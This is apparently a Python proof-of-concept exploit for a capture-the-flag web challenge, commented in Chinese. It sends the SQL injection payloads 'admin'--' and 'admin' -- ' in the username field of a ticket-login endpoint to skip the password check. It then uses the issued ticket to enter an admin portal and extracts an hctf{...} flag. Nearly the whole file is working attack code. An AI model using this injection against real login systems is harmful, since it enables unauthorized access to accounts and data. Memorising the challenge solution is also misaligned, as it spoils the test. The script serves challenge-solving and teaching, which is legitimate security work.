#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""web_sqli 利用链条 PoC：SQL 注入绕过登录 -> 管理员身份进门户 -> 拿 flag。

步骤化演示（非 PASS/FAIL 断言脚本）：
  1. 错误口令登录，观察「用户名或密码错误」
  2. 用户名注入 admin'-- 绕过口令比较，拿到 TGT/ST 票据
  3. 携带票据访问门户 /sc/portal，以管理员身份看到内部公告
  4. 从公告里提取 hctf{...}

用法：python3 exp.py http://HOST:58000
仅用标准库，无第三方依赖。
"""
import json
import re
import sys
import urllib.parse
import urllib.request

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:58000"
TICKETS = BASE + "/lyuapServer/v1/tickets"
PORTAL = BASE + "/sc/portal"


def login(username, password):
    body = urllib.parse.urlencode({"username": username, "password": password}).encode()
    req = urllib.request.Request(TICKETS, data=body,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    with urllib.request.urlopen(req, timeout=15) as r:
        return json.loads(r.read().decode())


print("[*] target:", BASE)

# --- 步骤 1：错误口令，登录失败（NOUSER） ------------------------------
resp = login("admin", "wrong-password")
print("[1] 错误口令登录 ->", resp)
assert resp == {"data": {"code": "NOUSER", "uid": "", "vcodes": ""}}, "预期登录失败"

# --- 步骤 2：用户名注入，闭合引号并注释掉口令比较 ----------------------
# 页面登录会把输入去空白，payload 无空格；此处直接打接口，两种形态均可
for payload in ("admin'--", "admin' -- "):
    resp = login(payload, "whatever")
    print(f"[2] 注入登录 username={payload!r} ->", resp)
    if "tgt" in resp:
        break
assert "tgt" in resp and "ticket" in resp, "注入未生效，未拿到票据"
ticket = resp["ticket"]

# --- 步骤 3：携票据进门户（管理员身份） --------------------------------
with urllib.request.urlopen(PORTAL + "?ticket=" + urllib.parse.quote(ticket), timeout=15) as r:
    page = r.read().decode("utf-8")
print("[3] 门户页已取回，含管理员公告:", "网络安全宣传周" in page)

# --- 步骤 4：提取 flag --------------------------------------------------
m = re.search(r"hctf\{[^}]*\}", page)
print("[4] flag:", m.group(0) if m else "未找到（当前身份不是管理员？）")
